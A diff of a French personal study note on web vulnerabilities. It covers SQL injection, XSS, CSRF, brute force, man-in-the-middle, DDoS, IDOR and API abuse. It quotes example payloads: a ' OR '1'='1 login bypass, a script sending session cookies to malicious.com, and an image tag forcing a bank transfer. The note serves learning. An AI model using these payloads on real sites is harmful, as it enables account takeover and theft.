@@ -195,8 +195,7 @@ sommaire :
    - si on remplis uniquement le 'username' avec [' OR '1'='1], ca donne cette requete :   
 		 `SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';`   
 		 1=1 est toujours vraie donc on peut se connecter avec n'importe username sans le mot de passe
-2. **xss**   
-   Cross-Site Scripting   
+2. **xss** Cross-Site Scripting   
    injecter du code "malveillant" sur une page vue par un autre utilisateur, par exemple pour recuperer ses cookies de session   
    ex d'attaque xss sur un site web qui permet de faire une recherche :
 	 - le site possede une page avec un champ de recherche, on peut chercher "babar" par exemple :   
@@ -210,11 +209,10 @@ sommaire :
 		 `les resultats pour votre recherche "babar" sont etc...`
    - au lieu d'envoyer "babar" dans le champs de recherche de l'url, on peut y mettre un script, il s'executera dans le front :   
 		 `<script>document.location='http://malicious.com/steal?cookie='+document.cookie</script>`   
-		 les resultats pour votre recherche <script>...</script>   
+		 `les resultats pour votre recherche <script>...</script>`   
 		 -> le script est executé   
 		 en l'occurence, il vole les cookies de session de la personne et les envois a l'adresse "http://malicious.com/steal", on peut donc ensuite se connecter a son compte
-3. **csrf**
-   Cross-Site Request Forgery   
+3. **csrf** Cross-Site Request Forgery   
 	 amener une personne à executer une action non-desiree sur un site web sur lequel elle est connectée, sans s'en rendre compte   
 	 ex d'attaque pour recevoir un virement d'une personne :
 	 - une personne est connectée à sa banque en ligne
@@ -222,18 +220,17 @@ sommaire :
 	 - le code de l'image contient en fait une url de transfert de sa banque :   
 	   `<img src="http://yourbank.com/transfer?amount=1000&to=attacker_account" />`
    - comme la personne est connectee en ce moment meme à sa banque, celle-ci effectue le virement sans avertir (banque bien pourrave)
-4. **brute force**
+4. **brute force**   
    cette attaque consiste à essayer toutes les combinaisons possibles d'un mot de passe, jusqu'a tomber sur le bon   
 	 c'est une attaque simple à code donc pleins de petits robots parcours internet pour essayer automatiquement sur les sites webs   
 	 elle est souvent ameliorée en utilisant des dictionnaires, pour cherche en priorité les mots de passes les plus utilisés   
-5. **man in the middle**
+5. **man in the middle**   
    une personne arrive à se placer sur le reseau entre votre ordinateur et le site web que vous visitez   
 	 elle peut alors modifier, et peut-etre meme decripter, tous ce que vous envoyez et recevez   
 	 - ca peut servir à voler des cookies de sessions,
 	 - voir vos mots de passes ou informations sensibles,
 	 - ajouter du code malveillant dans vos echanges
-6. **dos & ddos**
-   Distributed Denial of Service   
+6. **ddos (& dos)** Distributed Denial of Service   
 	 c'est une attaque qui consiste en gros à empecher un server de fonctionner   
 	 elle est pratiquée en "accablant" le server avec bcp trop de requettes pour qu'il ne puisse plus faire ses taches habituelles   
 	 le but peut etre :
@@ -241,6 +238,18 @@ sommaire :
 	 - activisme politique
 	 - diversion
 	 - avantage competitif en business
-7. **idor**
-  
-8. **api abuse**
+7. **idor** Insecure Direct Object Reference   
+   cette faille consiste a pouvoir acceder directement à un "objet" d'une application web, sans protection   
+	 par "objet" je parle de fichiers, base de données, dossiers, mais meme bouts de codes genre point d'acces api secret, token de session, tout en fait   
+	 elle survient typiquement si une url permet d'acceder à quelque chose sans bien verifier les autorisations   
+	 ex :
+	 - l'url suivante permet de recuperer les infos d'un utilisateur connecté   
+	 `https://example.com/profile?user_id=123`
+	 - si on n'est pas connecté en tant qu'utilisateur "123" on ne devrait pas recevoir les infos
+	 - mais si on peut recevoir les infos quand meme, alors c'est une faille idor
+8. **api abuse**   
+   ça consiste à trouver un moyen d'utiliser l'api de maniere detournée   
+	 ex :
+	 - une boutique en ligne propose une promotion "5 articles achetés = -20% sur la commande"
+	 - cette logique est implémentée dans l'API de la boutique qui gère les commandes
+	 - une personne découvre qu'en utilisant l'API de la boutique, elle peut ajouter 5 articles à son panier pour déclencher la remise de 20%, puis supprimer 4 de ces articles tout en conservant la remise initiale
